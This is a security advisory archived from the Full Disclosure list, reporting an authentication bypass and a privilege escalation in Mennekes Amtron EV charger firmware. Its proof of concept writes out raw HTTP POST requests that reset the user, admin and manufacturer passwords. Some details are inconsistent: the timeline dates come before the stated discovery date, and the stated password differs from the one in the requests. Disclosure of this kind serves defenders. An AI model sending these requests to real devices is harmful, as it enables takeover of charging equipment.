---
title: CyberDanube Security Research 20260528-0 | Multiple Vulnerabilities in Multiple Vulnerabilities in Mennekes Amtron Series
url: https://seclists.org/fulldisclosure/2026/May/25
source: Full Disclosure
date: 2026-06-01
fetch_date: 2026-06-02T06:33:14.756673
---

# CyberDanube Security Research 20260528-0 | Multiple Vulnerabilities in Multiple Vulnerabilities in Mennekes Amtron Series

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20260528-0 | Multiple Vulnerabilities in Multiple Vulnerabilities in Mennekes Amtron Series

---

*From*: Thomas Weber | CyberDanube via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Fri, 29 May 2026 14:33:21 +0000

---

```
CyberDanube Security Research 20260528-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities
              product| Mennekes Amtron Series and Smart-T PnC
   vulnerable version| 5.22.3
        fixed version| 5.33.11-21500
           CVE number| CVE-2026-8979, CVE-2026-8980
               impact| High
             homepage| https://www.mennekes.at/
                found| 2025-11-27
                   by| S. Eisenreich-Dietz, T. Weber
                     | CyberDanube Security Research
                     | Austria - Vienna
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
For more than 80 years, MENNEKES has stood for quality electrical products and
service throughout the world. When it comes to solutions that handle current
intelligently and safely, we set the standard for innovation, quality,
manufacturing and development.

Source: https://www.mennekes.com/about/about-us

Vulnerable Products
-------------------------------------------------------------------------------
Amtron Professional
Amtron Professional (Eichrecht)
Amedio Professional
Amtron Charge Control
Amtron Professional Twincharge
Smart-T PnC

Vulnerability Overview
-------------------------------------------------------------------------------
1) Authentication Bypass (CVE-2026-8979)
An unauthentication attacker can use a crafted POST request to change the
password of the user account.

2) Privilege Escalation (CVE-2026-8980)
An authenticated attacker can use a crafted POST request to change the password
of the manufacturer and admin account as low privileged user.

Proof of Concept
-------------------------------------------------------------------------------
1) Authentication Bypass (CVE-2026-8979)
The following POST request can be used to change the password of the user
account to "asdf"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /operator/operator HTTP/1.1
Host: 10.201.74.66
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/133.0.0.0 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag
e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
UserPwdPlain_custom=asdf
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

2) Privilege Escalation (CVE-2026-8980)
The following POST requests can be used to change the admin (operator) and
manufacturer account password to "asdf".

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /json/settings.json HTTP/1.1
Host: 10.201.74.66
Content-Length: 60
Authorization: e81179e1-5e50-45d4-8ee6-27161dcf69d8
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://10.201.74.66
Referer: http://10.201.74.66/groups/system
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
{"params":[{"key":"OperatorPwdPlain_custom","value":"asd"}]}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /json/settings.json HTTP/1.1
Host: 10.201.74.66
Content-Length: 59
Authorization: 526ee807-4295-46f3-a9e4-0f4bcac97af9
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://10.201.74.66
Referer: http://10.201.74.66/groups/system
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
{"params":[{"key":"ManufacturerPwd_custom","value":"asd"}]}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution
-------------------------------------------------------------------------------
Update to the newest Firmware.

Workaround
-------------------------------------------------------------------------------
Restrict access to the device.

Contact Timeline
-------------------------------------------------------------------------------
2025-02-24: Get in contact with psirt () mennekes de
2025-02-25: Vulnerabilities get acknowledged and are forwarded to BENDER
                as they are the manufacturer for the devices.
2025-03-18: Ask for update regarding fixes, CVE numbers, fixed version and
                effected products. Response states that they will not create
                CVEs.
2025-05-28: Release of advisory.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com

EOF S. Eisenreich-Dietz / @2026
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
![Next](/images/right-icon-16x16.png)

### Current thread:

* **CyberDanube Security Research 20260528-0 | Multiple Vulnerabilities in Multiple Vulnerabilities in Mennekes Amtron Series** *Thomas Weber | CyberDanube via Fulldisclosure (May 31)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/f...